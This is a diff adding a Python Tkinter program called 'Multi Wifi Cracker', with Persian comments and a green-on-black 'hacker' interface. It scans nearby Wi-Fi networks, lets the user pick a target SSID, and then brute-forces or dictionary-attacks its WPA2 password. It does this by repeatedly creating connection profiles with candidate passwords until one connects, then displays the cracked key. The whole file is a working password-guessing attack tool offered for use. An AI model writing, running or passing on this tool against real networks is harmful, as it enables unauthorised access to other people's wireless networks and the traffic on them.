@@ -1,0 +1,647 @@
+import pywifi
+from pywifi import const
+import time
+import sys
+import string
+import tkinter as tk
+from tkinter import ttk, filedialog, messagebox, scrolledtext
+from itertools import product, islice
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from collections import deque
+import threading
+import random
+
+
+class HackerWiFiBruteForcer:
+    def __init__(self, root):
+        self.root = root
+        self.root.iconbitmap('Hack_Wifi.ico')
+        self.root.title("Multi Wifi Cracker")
+        self.root.geometry("1000x800")
+        self.root.configure(bg='#000000')
+
+
+        # تنظیم تم هکری
+        self.setup_hacker_theme()
+
+        self.wifi = pywifi.PyWiFi()
+        self.iface = self.wifi.interfaces()[0] if self.wifi.interfaces() else None
+        self.stop_flag = False
+        self.tested = 0
+        self.start_time = time.time()
+        self.password_history = deque(maxlen=20)
+        self.found_password = None
+        self.lock = threading.Lock()
+        self.current_ssid = None
+        self.wordlist = []  # لیست کلمات عبور
+        self.use_wordlist = False  # آیا از فایل استفاده کنیم؟
+
+        # تنظیمات سرعت از کد اصلی
+        self.MAX_WORKERS = 12
+        self.BATCH_SIZE = 20
+        self.CONNECT_TIMEOUT = 0.5
+
+        self.setup_gui()
+        self.start_hacker_animation()
+
+    def setup_hacker_theme(self):
+        style = ttk.Style()
+        style.theme_use('clam')
+
+        # رنگ‌های هکری
+        style.configure('TFrame', background='#000000')
+        style.configure('TLabel', background='#000000', foreground='#00ff00', font=('Consolas', 10))
+        style.configure('TButton', background='#003300', foreground='#00ff00', font=('Consolas', 10),
+                        borderwidth=1, focusthickness=3, focuscolor='#00ff00')
+        style.configure('Treeview', background='#001100', fieldbackground='#001100',
+                        foreground='#00ff00', font=('Consolas', 9))
+        style.configure('Treeview.Heading', background='#002200', foreground='#00ff00',
+                        font=('Consolas', 10, 'bold'))
+        style.configure('TCombobox', fieldbackground='#001100', background='#002200',
+                        foreground='#00ff00', font=('Consolas', 10))
+        style.configure('TSpinbox', fieldbackground='#001100', background='#002200',
+                        foreground='#00ff00', font=('Consolas', 10))
+        style.configure('TEntry', fieldbackground='#001100', foreground='#00ff00',
+                        font=('Consolas', 10), insertcolor='#00ff00')
+
+    def setup_gui(self):
+        # هدر هکری
+        header = tk.Frame(self.root, bg='#000000', height=60)
+        header.pack(fill='x', pady=(0, 10))
+
+        title = tk.Label(header, text="Multi Wifi Cracker", font=('Courier', 18, 'bold'),
+                         bg='#000000', fg='#00ff00')
+        title.pack(pady=15)
+
+        subtitle = tk.Label(header, text="Advanced Wireless Security Penetration Tool",
+                            font=('Courier', 10), bg='#000000', fg='#00cc00')
+        subtitle.pack()
+
+        # نوت‌بوک اصلی
+        notebook = ttk.Notebook(self.root)
+        notebook.pack(fill='both', expand=True, padx=15, pady=5)
+
+        # تب اسکن
+        scan_frame = ttk.Frame(notebook)
+        notebook.add(scan_frame, text="📡 NETWORK SCAN")
+        self.setup_scan_tab(scan_frame)
+
+        # تب حمله
+        attack_frame = ttk.Frame(notebook)
+        notebook.add(attack_frame, text="⚡ BRUTE FORCE")
+        self.setup_attack_tab(attack_frame)
+
+        # تب نتایج
+        result_frame = ttk.Frame(notebook)
+        notebook.add(result_frame, text="📊 RESULTS")
+        self.setup_result_tab(result_frame)
+
+        # وضعیت
+        self.status_var = tk.StringVar(value="🟢 SYSTEM READY")
+        status_bar = tk.Label(self.root, textvariable=self.status_var, relief='sunken',
+                              anchor='w', bg='#001100', fg='#00ff00', font=('Consolas', 10))
+        status_bar.pack(side='bottom', fill='x', padx=15, pady=5)
+
+        # انیمیشن هکری
+        self.animation_label = tk.Label(self.root, text="", bg='#000000', fg='#00ff00',
+                                        font=('Courier', 8))
+        self.animation_label.pack(side='bottom', fill='x')
+
+    def setup_scan_tab(self, parent):
+        frame = ttk.Frame(parent)
+        frame.pack(fill='both', expand=True, padx=10, pady=10)
+
+        # دکمه اسکن
+        scan_btn = tk.Button(frame, text="🛰️ SCAN NETWORKS", command=self.scan_networks,
+                             bg='#002200', fg='#00ff00', font=('Consolas', 12, 'bold'),
+                             relief='raised', bd=2, cursor='hand2')
+        scan_btn.pack(pady=15)
+
+        # لیست شبکه‌ها
+        tree_frame = tk.Frame(frame, bg='#001100')
+        tree_frame.pack(fill='both', expand=True, pady=10)
+
+        self.network_tree = ttk.Treeview(tree_frame, columns=('signal', 'security'),
+                                         show='tree headings', height=12)
+
+        self.network_tree.heading('#0', text='TARGET SSID')
+        self.network_tree.heading('signal', text='SIGNAL dBm')
+        self.network_tree.heading('security', text='SECURITY')
+
+        self.network_tree.column('#0', width=250, anchor='w')
+        self.network_tree.column('signal', width=80, anchor='center')
+        self.network_tree.column('security', width=100, anchor='center')
+
+        scrollbar = ttk.Scrollbar(tree_frame, orient='vertical', command=self.network_tree.yview)
+        self.network_tree.configure(yscrollcommand=scrollbar.set)
+
+        self.network_tree.pack(side='left', fill='both', expand=True)
+        scrollbar.pack(side='right', fill='y')
+
+    def setup_attack_tab(self, parent):
+        frame = ttk.Frame(parent)
+        frame.pack(fill='both', expand=True, padx=10, pady=10)
+
+        # تنظیمات حمله
+        attack_frame = tk.LabelFrame(frame, text="⚙️ ATTACK CONFIG", bg='#000000',
+                                     fg='#00ff00', font=('Consolas', 11, 'bold'))
+        attack_frame.pack(fill='x', pady=5)
+
+        # نوع حمله
+        tk.Label(attack_frame, text="ATTACK TYPE:", bg='#000000', fg='#00ff00',
+                 font=('Consolas', 10)).grid(row=0, column=0, sticky='w', padx=10, pady=5)
+
+        self.attack_type_var = tk.StringVar(value="BRUTE_FORCE")
+        attack_type_combo = ttk.Combobox(attack_frame, textvariable=self.attack_type_var, state='readonly')
+        attack_type_combo['values'] = ('BRUTE_FORCE', 'DICTIONARY')
+        attack_type_combo.grid(row=0, column=1, padx=10, pady=5)
+        attack_type_combo.bind('<<ComboboxSelected>>', self.toggle_attack_type)
+
+        # نوع کاراکتر (برای حمله Brute Force)
+        self.charset_label = tk.Label(attack_frame, text="CHAR SET:", bg='#000000', fg='#00ff00',
+                                      font=('Consolas', 10))
+        self.charset_label.grid(row=1, column=0, sticky='w', padx=10, pady=5)
+
+        self.charset_var = tk.StringVar(value="NUMERIC")
+        self.charset_combo = ttk.Combobox(attack_frame, textvariable=self.charset_var, state='readonly')
+        self.charset_combo['values'] = (
+        'NUMERIC', 'LOWER_ALPHA', 'UPPER_ALPHA', 'MIXED_ALPHA', 'ALPHA_NUMERIC', 'FULL_SET')
+        self.charset_combo.grid(row=1, column=1, padx=10, pady=5)
+
+        # طول (برای حمله Brute Force)
+        self.length_label = tk.Label(attack_frame, text="LENGTH:", bg='#000000', fg='#00ff00',
+                                     font=('Consolas', 10))
+        self.length_label.grid(row=2, column=0, sticky='w', padx=10, pady=5)
+
+        self.length_var = tk.StringVar(value="8")
+        self.length_spin = ttk.Spinbox(attack_frame, from_=4, to=12, textvariable=self.length_var, width=8)
+        self.length_spin.grid(row=2, column=1, padx=10, pady=5, sticky='w')
+
+        # شروع از (برای حمله Brute Force)
+        self.start_num_label = tk.Label(attack_frame, text="START FROM:", bg='#000000', fg='#00ff00',
+                                        font=('Consolas', 10))
+        self.start_num_label.grid(row=3, column=0, sticky='w', padx=10, pady=5)
+
+        self.start_num_var = tk.StringVar()
+        self.start_num_entry = tk.Entry(attack_frame, textvariable=self.start_num_var, bg='#001100',
+                                        fg='#00ff00', font=('Consolas', 10), width=15)
+        self.start_num_entry.grid(row=3, column=1, padx=10, pady=5, sticky='w')
+
+        # وضعیت فایل دیکشنری
+        self.wordlist_status = tk.StringVar(value="NO WORDLIST LOADED")
+        self.wordlist_label = tk.Label(attack_frame, textvariable=self.wordlist_status,
+                                       bg='#000000', fg='#00cc00', font=('Consolas', 9))
+        self.wordlist_label.grid(row=4, column=0, columnspan=2, pady=5)
+
+        # دکمه‌های فایل
+        file_frame = tk.Frame(attack_frame, bg='#000000')
+        file_frame.grid(row=5, column=0, columnspan=2, pady=10)
+
+        self.load_wordlist_btn = tk.Button(file_frame, text="📁 LOAD WORDLIST", command=self.load_wordlist,
+                                           bg='#002200', fg='#00ff00', font=('Consolas', 9))
+        self.load_wordlist_btn.pack(side='left', padx=5)
+
+        # تخمین
+        estimate_frame = tk.LabelFrame(frame, text="📈 TIME ESTIMATION", bg='#000000',
+                                       fg='#00ff00', font=('Consolas', 11, 'bold'))
+        estimate_frame.pack(fill='x', pady=5)
+
+        self.estimate_text = tk.Text(estimate_frame, height=4, bg='#001100', fg='#00ff00',
+                                     font=('Consolas', 9), relief='flat')
+        self.estimate_text.pack(fill='x', padx=10, pady=5)
+        self.estimate_text.insert('1.0', "SELECT PARAMETERS TO ESTIMATE...")
+        self.estimate_text.config(state='disabled')
+
+        # دکمه‌های کنترل
+        control_frame = tk.Frame(frame, bg='#000000')
+        control_frame.pack(pady=20)
+
+        tk.Button(control_frame, text="🚀 START ATTACK", command=self.start_attack,
+                  bg='#004400', fg='#00ff00', font=('Consolas', 12, 'bold'),
+                  relief='raised', bd=3, cursor='hand2').pack(side='left', padx=10)
+
+        tk.Button(control_frame, text="⏹ STOP", command=self.stop_attack,
+                  bg='#440000', fg='#ff0000', font=('Consolas', 10),
+                  relief='raised', bd=2).pack(side='left', padx=10)
+
+        # bind events
+        self.charset_combo.bind('<<ComboboxSelected>>', self.update_estimate)
+        self.length_spin.bind('<<Increment>>', self.update_estimate)
+        self.length_spin.bind('<<Decrement>>', self.update_estimate)
+        self.start_num_entry.bind('<KeyRelease>', self.update_estimate)
+        attack_type_combo.bind('<<ComboboxSelected>>', self.update_estimate)
+
+    def setup_result_tab(self, parent):
+        frame = ttk.Frame(parent)
+        frame.pack(fill='both', expand=True, padx=10, pady=10)
+
+        # آمار
+        stats_frame = tk.LabelFrame(frame, text="📊 LIVE STATS", bg='#000000',
+                                    fg='#00ff00', font=('Consolas', 11, 'bold'))
+        stats_frame.pack(fill='x', pady=5)
+
+        self.stats_text = tk.Text(stats_frame, height=5, bg='#001100', fg='#00ff00',
+                                  font=('Consolas', 10), relief='flat')
+        self.stats_text.pack(fill='x', padx=10, pady=5)
+        self.stats_text.insert('1.0', "WAITING FOR ATTACK TO START...")
+        self.stats_text.config(state='disabled')
+
+        # تاریخچه
+        history_frame = tk.LabelFrame(frame, text="🔄 LAST ATTEMPTS", bg='#000000',
+                                      fg='#00ff00', font=('Consolas', 11, 'bold'))
+        history_frame.pack(fill='both', expand=True, pady=5)
+
+        self.history_text = scrolledtext.ScrolledText(history_frame, height=10,
+                                                      bg='#001100', fg='#00ff00',
+                                                      font=('Courier', 9), relief='flat')
+        self.history_text.pack(fill='both', expand=True, padx=10, pady=5)
+
+        # نتیجه
+        result_frame = tk.LabelFrame(frame, text="🎯 RESULT", bg='#000000',
+                                     fg='#00ff00', font=('Consolas', 11, 'bold'))
+        result_frame.pack(fill='x', pady=5)
+
+        self.result_text = tk.Text(result_frame, height=3, bg='#001100', fg='#00ff00',
+                                   font=('Consolas', 11, 'bold'), relief='flat')
+        self.result_text.pack(fill='x', padx=10, pady=5)
+        self.result_text.insert('1.0', ">>> AWAITING COMMAND <<<")
+        self.result_text.config(state='disabled')
+
+    def toggle_attack_type(self, event=None):
+        """سوییچ بین حالت Brute Force و Dictionary Attack"""
+        if self.attack_type_var.get() == "DICTIONARY":
+            # غیرفعال کردن کنترل‌های Brute Force
+            self.charset_label.config(state='disabled')
+            self.charset_combo.config(state='disabled')
+            self.length_label.config(state='disabled')
+            self.length_spin.config(state='disabled')
+            self.start_num_label.config(state='disabled')
+            self.start_num_entry.config(state='disabled')
+
+            # فعال کردن دکمه بارگذاری دیکشنری
+            self.load_wordlist_btn.config(state='normal')
+
+            # آپدیت تخمین زمان
+            self.update_estimate()
+        else:
+            # فعال کردن کنترل‌های Brute Force
+            self.charset_label.config(state='normal')
+            self.charset_combo.config(state='normal')
+            self.length_label.config(state='normal')
+            self.length_spin.config(state='normal')
+            self.start_num_label.config(state='normal')
+            self.start_num_entry.config(state='normal')
+
+            # آپدیت تخمین زمان
+            self.update_estimate()
+
+    def start_hacker_animation(self):
+        def update_animation():
+            animations = [
+                ">>> CONNECTING TO TARGET NETWORK <<<",
+                ">>> BYPASSING SECURITY PROTOCOLS <<<",
+                ">>> INITIATING BRUTE FORCE SEQUENCE <<<",
+                ">>> ANALYZING NETWORK TRAFFIC <<<",
+                ">>> CRACKING WPA2 ENCRYPTION <<<"
+            ]
+            self.animation_label.config(text=random.choice(animations))
+            self.root.after(2000, update_animation)
+
+        update_animation()
+
+    def load_wordlist(self):
+        file_path = filedialog.askopenfilename(
+            title="SELECT WORDLIST FILE",
+            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
+        )
+        if file_path:
+            try:
+                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+                    self.wordlist = [line.strip() for line in f if line.strip()]
+                self.wordlist_status.set(f"✓ LOADED {len(self.wordlist)} PASSWORDS")
+                messagebox.showinfo("SUCCESS", f"✓ LOADED {len(self.wordlist)} PASSWORDS")
+                self.update_estimate()
+            except Exception as e:
+                messagebox.showerror("ERROR", f"LOAD FAILED: {e}")
+
+    def scan_networks(self):
+        def scan_thread():
+            self.status_var.set("🔍 SCANNING NETWORKS...")
+            self.network_tree.delete(*self.network_tree.get_children())
+
+            try:
+                self.iface.scan()
+                time.sleep(3)
+                networks = self.iface.scan_results()
+
+                for net in networks:
+                    security = "WPA2" if const.AKM_TYPE_WPA2PSK in net.akm else "OPEN"
+                    self.network_tree.insert('', 'end', text=net.ssid,
+                                             values=(net.signal, security))
+
+                self.status_var.set(f"✓ FOUND {len(networks)} NETWORKS")
+            except Exception as e:
+                self.status_var.set("✗ SCAN FAILED")
+
+        threading.Thread(target=scan_thread, daemon=True).start()
+
+    def update_estimate(self, event=None):
+        try:
+            if self.attack_type_var.get() == "DICTIONARY":
+                if not self.wordlist:
+                    estimate_text = "PLEASE LOAD A WORDLIST FIRST"
+                else:
+                    total_passwords = len(self.wordlist)
+                    estimate_text = f"📊 TOTAL PASSWORDS: {total_passwords:,}\n"
+
+                    # تخمین سرعت برای حمله دیکشنری
+                    speed = 15  # سرعت متوسط برای حمله دیکشنری
+                    estimated_time = total_passwords / speed
+
+                    if estimated_time > 86400:
+                        estimate_text += f"⏰ ESTIMATED TIME: {estimated_time / 86400:.1f} days"
+                    elif estimated_time > 3600:
+                        estimate_text += f"⏰ ESTIMATED TIME: {estimated_time / 3600:.1f} hours"
+                    elif estimated_time > 60:
+                        estimate_text += f"⏰ ESTIMATED TIME: {estimated_time / 60:.1f} minutes"
+                    else:
+                        estimate_text += f"⏰ ESTIMATED TIME: {estimated_time:.1f} seconds"
+
+                    estimate_text += f"\n🚀 ESTIMATED SPEED: {speed} tests/second"
+            else:
+                charset_map = {
+                    'NUMERIC': string.digits,
+                    'LOWER_ALPHA': string.ascii_lowercase,
+                    'UPPER_ALPHA': string.ascii_uppercase,
+                    'MIXED_ALPHA': string.ascii_letters,
+                    'ALPHA_NUMERIC': string.digits + string.ascii_letters,
+                    'FULL_SET': string.digits + string.ascii_letters + "!@#$%^&*()"
+                }
+
+                charset = charset_map[self.charset_var.get()]
+                length = int(self.length_var.get())
+                start_num = self.start_num_var.get()
+
+                total_combinations = len(charset) ** length
+
+                if start_num and charset == string.digits and start_num.isdigit() and len(start_num) == length:
+                    start_index = int(start_num)
+                    remaining = total_combinations - start_index
+                    estimate_text = f"📊 REMAINING COMBINATIONS: {remaining:,}\n"
+                else:
+                    estimate_text = f"📊 TOTAL COMBINATIONS: {total_combinations:,}\n"
+
+                # تخمین سرعت از کد اصلی
+                charset_size = len(charset)
+                if charset_size <= 10:
+                    speed = 50
+                elif charset_size <= 26:
+                    speed = 30
+                elif charset_size <= 52:
+                    speed = 20
+                elif charset_size <= 62:
+                    speed = 15
+                else:
+                    speed = 10
+
+                estimated_time = (remaining if 'remaining' in locals() else total_combinations) / speed
+
+                if estimated_time > 86400:
+                    estimate_text += f"⏰ ESTIMATED TIME: {estimated_time / 86400:.1f} days"
+                elif estimated_time > 3600:
+                    estimate_text += f"⏰ ESTIMATED TIME: {estimated_time / 3600:.1f} hours"
+                elif estimated_time > 60:
+                    estimate_text += f"⏰ ESTIMATED TIME: {estimated_time / 60:.1f} minutes"
+                else:
+                    estimate_text += f"⏰ ESTIMATED TIME: {estimated_time:.1f} seconds"
+
+                estimate_text += f"\n🚀 ESTIMATED SPEED: {speed} tests/second"
+
+            self.estimate_text.config(state='normal')
+            self.estimate_text.delete('1.0', 'end')
+            self.estimate_text.insert('1.0', estimate_text)
+            self.estimate_text.config(state='disabled')
+
+        except:
+            pass
+
+    def start_attack(self):
+        if not self.network_tree.selection():
+            messagebox.showwarning("WARNING", "SELECT A TARGET NETWORK FIRST!")
+            return
+
+        if self.attack_type_var.get() == "DICTIONARY" and not self.wordlist:
+            messagebox.showwarning("WARNING", "PLEASE LOAD A WORDLIST FIRST!")
+            return
+
+        selected = self.network_tree.selection()[0]
+        target_ssid = self.network_tree.item(selected, 'text')
+        self.current_ssid = target_ssid
+
+        self.stop_flag = False
+        self.tested = 0
+        self.start_time = time.time()
+        self.password_history.clear()
+        self.found_password = None
+
+        self.status_var.set(f"⚡ ATTACKING: {target_ssid}")
+        self.result_text.config(state='normal')
+        self.result_text.delete('1.0', 'end')
+        self.result_text.insert('1.0', f">>> INITIATING ATTACK ON: {target_ssid} <<<")
+        self.result_text.config(state='disabled')
+
+        threading.Thread(target=self.run_attack, daemon=True).start()
+
+    def run_attack(self):
+        try:
+            if self.attack_type_var.get() == "DICTIONARY":
+                self.dictionary_attack()
+            else:
+                charset_map = {
+                    'NUMERIC': string.digits,
+                    'LOWER_ALPHA': string.ascii_lowercase,
+                    'UPPER_ALPHA': string.ascii_uppercase,
+                    'MIXED_ALPHA': string.ascii_letters,
+                    'ALPHA_NUMERIC': string.digits + string.ascii_letters,
+                    'FULL_SET': string.digits + string.ascii_letters + "!@#$%^&*()"
+                }
+
+                charset = charset_map[self.charset_var.get()]
+                length = int(self.length_var.get())
+                start_num = self.start_num_var.get() or None
+
+                self.brute_force_attack(charset, length, start_num)
+
+        except Exception as e:
+            self.status_var.set("✗ ATTACK FAILED")
+            self.update_result(f"ERROR: {str(e)}")
+
+    def dictionary_attack(self):
+        """حمله دیکشنری با استفاده از فایل متنی"""
+        profile = self.create_profile(self.current_ssid)
+
+        for i in range(0, len(self.wordlist), self.BATCH_SIZE):
+            if self.stop_flag:
+                break
+
+            batch = self.wordlist[i:i + self.BATCH_SIZE]
+            result = self.try_connect_batch(profile, batch)
+
+            if result:
+                self.found_password = result[0]
+                break
+
+        self.finalize_attack()
+
+    def brute_force_attack(self, charset, length, start_num=None):
+        profile = self.create_profile(self.current_ssid)
+        total_combinations = len(charset) ** length
+
+        if start_num and charset == string.digits and start_num.isdigit() and len(start_num) == length:
+            # شروع از عدد خاص
+            start_index = int(start_num)
+            for i in range(start_index, total_combinations, self.BATCH_SIZE):
+                if self.stop_flag:
+                    break
+
+                batch = [str(j).zfill(length) for j in range(i, min(i + self.BATCH_SIZE, total_combinations))]
+                result = self.try_connect_batch(profile, batch)
+
+                if result:
+                    self.found_password = result[0]
+                    break
+        else:
+            # تولید عادی
+            for i in range(0, total_combinations, self.BATCH_SIZE):
+                if self.stop_flag:
+                    break
+
+                batch = []
+                for j in range(i, min(i + self.BATCH_SIZE, total_combinations)):
+                    password = []
+                    temp = j
+                    for _ in range(length):
+                        temp, idx = divmod(temp, len(charset))
+                        password.append(charset[idx])
+                    batch.append(''.join(reversed(password)))
+
+                result = self.try_connect_batch(profile, batch)
+
+                if result:
+                    self.found_password = result[0]
+                    break
+
+        self.finalize_attack()
+
+    def create_profile(self, ssid):
+        profile = pywifi.Profile()
+        profile.ssid = ssid
+        profile.auth = const.AUTH_ALG_OPEN
+        profile.akm.append(const.AKM_TYPE_WPA2PSK)
+        profile.cipher = const.CIPHER_TYPE_CCMP
+        return profile
+
+    def try_connect_batch(self, profile, passwords):
+        results = []
+        for password in passwords:
+            if self.stop_flag:
+                break
+
+            try:
+                profile.key = password
+                self.iface.remove_all_network_profiles()
+                tmp_profile = self.iface.add_network_profile(profile)
+                self.iface.connect(tmp_profile)
+
+                time.sleep(self.CONNECT_TIMEOUT)
+
+                if self.iface.status() == const.IFACE_CONNECTED:
+                    results.append(password)
+                    self.stop_flag = True
+                    break
+
+                self.update_display(password)
+
+            except Exception:
+                continue
+
+        return results
+
+    def update_display(self, password):
+        with self.lock:
+            self.tested += 1
+            self.password_history.append(password)
+
+            elapsed = time.time() - self.start_time
+            speed = self.tested / elapsed if elapsed > 0 else 0
+
+            # آپدیت آمار
+            stats = f"""TOTAL TESTED: {self.tested:,}
+TIME ELAPSED: {elapsed:.1f}s
+SPEED: {speed:.1f} p/s
+LAST TRY: {password}"""
+
+            self.stats_text.config(state='normal')
+            self.stats_text.delete('1.0', 'end')
+            self.stats_text.insert('1.0', stats)
+            self.stats_text.config(state='disabled')
+
+            # آپدیت تاریخچه
+            if self.tested % 10 == 0:
+                self.history_text.delete('1.0', 'end')
+                for pwd in list(self.password_history)[-15:]:
+                    self.history_text.insert('end', f"[{self.tested}] {pwd}\n")
+
+            self.status_var.set(f"🔓 TESTING: {password}")
+
+    def finalize_attack(self):
+        elapsed = time.time() - self.start_time
+        speed = self.tested / elapsed if elapsed > 0 else 0
+
+        if self.found_password:
+            result = f"""✅ CRACK SUCCESSFUL!
+🔑 PASSWORD: {self.found_password}
+⏰ TIME: {elapsed:.2f}s
+📊 TOTAL: {self.tested:,}
+🚀 AVG SPEED: {speed:.1f}p/s"""
+            self.status_var.set("✅ PASSWORD CRACKED!")
+        else:
+            result = f"""❌ CRACK FAILED
+⏰ TIME: {elapsed:.2f}s
+📊 TOTAL: {self.tested:,}
+🚀 AVG SPEED: {speed:.1f}p/s"""
+            self.status_var.set("❌ CRACK FAILED")
+
+        self.update_result(result)
+
+    def update_result(self, text):
+        self.result_text.config(state='normal')
+        self.result_text.delete('1.0', 'end')
+        self.result_text.insert('1.0', text)
+        self.result_text.config(state='disabled')
+
+    def stop_attack(self):
+        self.stop_flag = True
+        self.status_var.set("⏹ ATTACK STOPPED")
+
+    def clear_results(self):
+        self.stats_text.config(state='normal')
+        self.stats_text.delete('1.0', 'end')
+        self.stats_text.config(state='disabled')
+
+        self.history_text.delete('1.0', 'end')
+
+        self.result_text.config(state='normal')
+        self.result_text.delete('1.0', 'end')
+        self.result_text.insert('1.0', ">>> SYSTEM RESET <<<")
+        self.result_text.config(state='disabled')
+
+
+def main():
+    root = tk.Tk()
+    app = HackerWiFiBruteForcer(root)
+    root.mainloop()
+
+
+if __name__ == "__main__":
+    main()
